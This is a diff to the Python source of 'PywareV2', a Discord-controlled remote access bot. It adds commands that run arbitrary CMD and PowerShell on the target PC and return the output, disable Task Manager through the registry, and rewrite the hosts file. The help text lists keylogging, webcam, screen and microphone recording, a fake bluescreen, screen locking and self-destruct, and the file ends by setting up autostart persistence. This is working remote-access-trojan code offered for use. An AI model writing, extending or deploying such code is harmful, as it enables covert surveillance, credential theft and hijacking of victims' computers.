@@ -1125,70 +1125,207 @@ async def help_command(ctx):
         return
     
     embed = discord.Embed(
-        title="🤖 Bot Command Help",
-        description="All available commands for system control",
+        title="🤖 PywareV2 - Command Help",
+        description="**Admin Remote Control Bot**\nPrefix: `!` | All commands require your PC-Name",
         color=0x3498db
     )
-    
+
+    # System Commands
     embed.add_field(
-        name="🖥️ System Commands",
+        name="🖥️ **System Commands**",
         value=(
-            "`!systeminfo PC-Name` - Show detailed system info\n"
+            "`!systeminfo PC-Name` - Detailed system info\n"
             "`!tasklist PC-Name` - List running processes\n"
             "`!killtask PC-Name ProcessName` - Kill a process\n"
-            "`!startprocess PC-Name \"Path\"` - Start a process\n"
-            "`!stop PC-Name` - Shutdown bot on this PC\n"
-            "`!kill PC-Name` - Completely remove bot (self-destruct)"
+            "`!startprocess PC-Name \"Path\"` - Start an EXE\n"
+            "`!disabletaskmanager PC-Name` - Disable Task Manager\n"
+            "`!enabletaskmanager PC-Name` - Re-enable it\n"
+            "`!cmd PC-Name \"command\"` - Run CMD commands\n"
+            "`!powershell PC-Name \"script\"` - Run PowerShell\n"
+            "`!stop PC-Name` - Shutdown bot\n"
+            "`!kill PC-Name` - Self-destruct bot"
         ),
         inline=False
     )
-    
+
+    # Network/Web Commands
     embed.add_field(
-        name="📸 Media Commands",
+        name="🌐 **Network/Web**",
+        value=(
+            "`!blockwebsite PC-Name \"URL\"` - Block a site\n"
+            "`!unblockwebsite PC-Name \"URL\"` - Unblock it\n"
+        ),
+        inline=False
+    )
+
+    # Media Commands
+    embed.add_field(
+        name="📸 **Media Controls**",
         value=(
             "`!screenshot PC-Name` - Capture all monitors\n"
             "`!webcam PC-Name` - Take webcam photo\n"
-            "`!clip PC-Name [Duration]` - Record webcam video\n"
-            "`!recdesktop PC-Name [Duration]` - Record desktop\n"
-            "`!recmicrophone PC-Name [Duration]` - Record microphone"
+            "`!recdesktop PC-Name [Seconds]` - Record screen\n"
+            "`!recmicrophone PC-Name [Seconds]` - Record audio"
         ),
         inline=False
     )
-    
+
+    # Fun/Trolling
     embed.add_field(
-        name="🎭 Fun Commands",
+        name="🎭 **Fun Commands**",
         value=(
             "`!jumpscare PC-Name` - Trigger jumpscare\n"
-            "`!bluescreen PC-Name` - Trigger BSOD\n"
+            "`!bluescreen PC-Name` - Fake BSOD\n"
             "`!rickroll PC-Name` - Rickroll the user\n"
-            "`!lock PC-Name` - Lock all monitors\n"
-            "`!unlock PC-Name` - Unlock system"
+            "`!lock PC-Name` - Lock system\n"
+            "`!unlock PC-Name` - Unlock system\n"
         ),
         inline=False
     )
-    
+
+    # Keylogger
     embed.add_field(
-        name="⌨️ Keylogger Commands",
+        name="⌨️ **Keylogger**",
         value=(
             "`!keyloggerstart PC-Name` - Start keylogger\n"
-            "`!keyloggerstop PC-Name` - Stop and send logs\n"
-            "`!keyloggerstatus PC-Name` - Show keylogger status"
+            "`!keyloggerstop PC-Name` - Stop & send logs\n"
+            "`!keyloggerstatus PC-Name` - Show status"
         ),
         inline=False
     )
-    
-    embed.add_field(
-        name="🛠️ Utility",
-        value=(
-            "`!clean` - Clean the channel (750 messages)\n"
-            "`!help` - Show this help message"
-        ),
-        inline=False
-    )
-    
-    embed.set_footer(text=f"Requested by {ctx.author.display_name}")
-    
+
+    embed.set_footer(text=f"Requested by {ctx.author.display_name} | Bot by Ole4923")
     await ctx.send(embed=embed)
+
+@bot.command(name="disabletaskmanager")
+async def disable_taskmanager(ctx, pc_name: str):
+    """Disable Task Manager (!disabletaskmanager PC-Name)"""
+    if pc_name.lower() != get_pc_name():
+        return
+
+    try:
+        subprocess.run(
+            ['reg', 'add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System', 
+             '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'],
+            check=True
+        )
+        await ctx.send("✅ Task Manager disabled")
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
+
+@bot.command(name="enabletaskmanager")
+async def enable_taskmanager(ctx, pc_name: str):
+    """Enable Task Manager (!enabletaskmanager PC-Name)"""
+    if pc_name.lower() != get_pc_name():
+        return
+
+    try:
+        subprocess.run(
+            ['reg', 'add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System', 
+             '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '0', '/f'],
+            check=True
+        )
+        await ctx.send("✅ Task Manager enabled")
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
+
+@bot.command(name="cmd")
+async def run_cmd(ctx, pc_name: str, *, command: str):
+    """Execute CMD command (!cmd PC-Name "command")"""
+    if pc_name.lower() != get_pc_name():
+        return
+
+    try:
+        result = subprocess.run(
+            command, 
+            shell=True, 
+            capture_output=True, 
+            text=True, 
+            timeout=30
+        )
+        
+        output = result.stdout or result.stderr or "No output"
+        if len(output) > 1500:
+            with io.StringIO(output) as f:
+                await ctx.send(
+                    "📜 Command output (truncated):",
+                    file=discord.File(f, "output.txt")
+                )
+        else:
+            await ctx.send(f"```\n{output}\n```")
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
+
+@bot.command(name="powershell")
+async def run_powershell(ctx, pc_name: str, *, script: str):
+    """Execute PowerShell script (!powershell PC-Name "script")"""
+    if pc_name.lower() != get_pc_name():
+        return
+
+    try:
+        result = subprocess.run(
+            ["powershell", "-Command", script],
+            capture_output=True,
+            text=True,
+            timeout=60
+        )
+        
+        output = result.stdout or result.stderr or "No output"
+        if len(output) > 1500:
+            with io.StringIO(output) as f:
+                await ctx.send(
+                    "📜 PowerShell output:",
+                    file=discord.File(f, "ps_output.txt")
+                )
+        else:
+            await ctx.send(f"```powershell\n{output}\n```")
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
+
+@bot.command(name="blockwebsite")
+async def block_website(ctx, pc_name: str, url: str):
+    """Block a website with/without www (!blockwebsite PC-Name "URL")"""
+    if pc_name.lower() != get_pc_name():
+        return
+
+    try:
+        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
+        clean_url = url.replace("https://", "").replace("http://", "").split("/")[0]
+        
+        with open(hosts_path, 'a') as f:
+            f.write(f"\n127.0.0.1 {clean_url}\n")
+            if not clean_url.startswith("www."):
+                f.write(f"127.0.0.1 www.{clean_url}\n")  # Blockiere auch www-Version
+        
+        await ctx.send(f"✅ Blocked: `{clean_url}` + `www.{clean_url}`")
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
+
+@bot.command(name="unblockwebsite")
+async def unblock_website(ctx, pc_name: str, url: str):
+    """Unblock a website (!unblockwebsite PC-Name "URL")"""
+    if pc_name.lower() != get_pc_name():
+        return
+
+    try:
+        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
+        clean_url = url.replace("https://", "").replace("http://", "").split("/")[0]
+        
+        # Lese Hosts-Datei und filtere ALLE Varianten der URL (mit/ohne www)
+        with open(hosts_path, 'r') as f:
+            lines = f.readlines()
+        
+        with open(hosts_path, 'w') as f:
+            for line in lines:
+                # Behalte Zeilen, die NICHT die URL enthalten (weder mit noch ohne www)
+                if clean_url not in line and f"www.{clean_url}" not in line:
+                    f.write(line)
+        
+        await ctx.send(f"✅ Unblocked: `{clean_url}` + `www.{clean_url}`")
+    except PermissionError:
+        await ctx.send("❌ Permission denied. Run bot as Administrator!")
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
 
 setup_autostart()
 bot.run(TOKEN)
